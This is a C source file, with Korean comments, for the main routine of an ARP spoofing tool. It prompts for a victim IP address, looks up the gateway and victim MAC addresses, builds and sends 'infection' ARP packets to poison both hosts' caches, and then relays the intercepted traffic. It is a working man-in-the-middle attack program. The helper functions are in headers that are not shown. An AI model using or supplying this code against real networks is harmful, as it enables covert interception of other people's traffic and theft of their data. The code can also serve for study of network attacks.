#include <stdio.h>
#include "getDeviceInfo.h"
#include "libnet.h"
#include "makeInfPacket.h"
#include "packetRelay.h"

int main()
{
	pcap_if_t *allDevice;
	pcap_if_t *viewDevice;
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	int select;
	PIP_ADAPTER_INFO Device;

	int myIP[IPv4_ADDR_LEN];
	int gateIP[IPv4_ADDR_LEN];
	int victimIP[IPv4_ADDR_LEN];
	u_int8_t myMAC[ETHER_ADDR_LEN];
	u_int8_t gateMAC[ETHER_ADDR_LEN];
	u_int8_t victimMAC[ETHER_ADDR_LEN];

	UCHAR vicInfPacket[2048];
	UCHAR gateInfPacket[2048];

	//
	// device 정보 얻기
	//
	if ((pcap_findalldevs(&allDevice, errbuf)) == -1)
	{
		printf("장치를 검색하는데 오류가 발생했습니다\n");
		printf("관리자 권한으로 실행시켜 주세요.\n");
		return 0;
	}

	printf("인터넷 환경을 선택해 주세요(1.유선, 2.무선) : ");
	scanf("%d", &select);

	viewDevice = allDevice;
	for (int i = 1; i < select; i++)
		viewDevice = viewDevice->next;

	Device = getDeviceInfo();
	if (Device == NULL)
	{
		printf("Device 정보를 읽어오는데 실패했습니다.\n");
		return -1;
	}


	//
	// device 열기
	//
	handle = pcap_open_live(viewDevice->name, 65536, 1, 1000, errbuf);
	pcap_freealldevs(allDevice);


	//
	// my, gate, victim IP addr 얻기
	//
	printf("victim의 IP address (xxx.xxx.xxx.xxx): ");
	getIP(Device, myIP, gateIP);
	scanf("%d.%d.%d.%d", &victimIP[0], &victimIP[1], &victimIP[2], &victimIP[3]);
	

	//
	// my, gate, victim MAC addr 얻기
	//
	for (int i = 0; i < ETHER_ADDR_LEN; i++)
		myMAC[i] = Device->Address[i];
	printf("\nGateway Mac 얻어오기\n");
	getMAC(handle, myIP, myMAC, gateIP, gateMAC);
	printf("victim MAC 얻어오기\n");
	getMAC(handle, myIP, myMAC, victimIP, victimMAC);

	
	//
	// 감염패킷 만들기
	//
	makeInfPacket(vicInfPacket, myMAC, victimMAC, gateIP, victimIP);
	makeInfPacket(gateInfPacket, myMAC, gateMAC, victimIP, gateIP);


	//
	// victim, gateway 감염시키기
	//
	sendInfPacket(handle, vicInfPacket, (sizeof(ETH_HDR) + sizeof(ARP_HDR)));
	sendInfPacket(handle, gateInfPacket, (sizeof(ETH_HDR) + sizeof(ARP_HDR)));
	
	//
	// 패킷 릴레이 시키기
	//
	packetRelay(handle, myMAC, myIP, victimMAC, victimIP, gateMAC, gateIP);


	pcap_close(handle);

	return 0;
}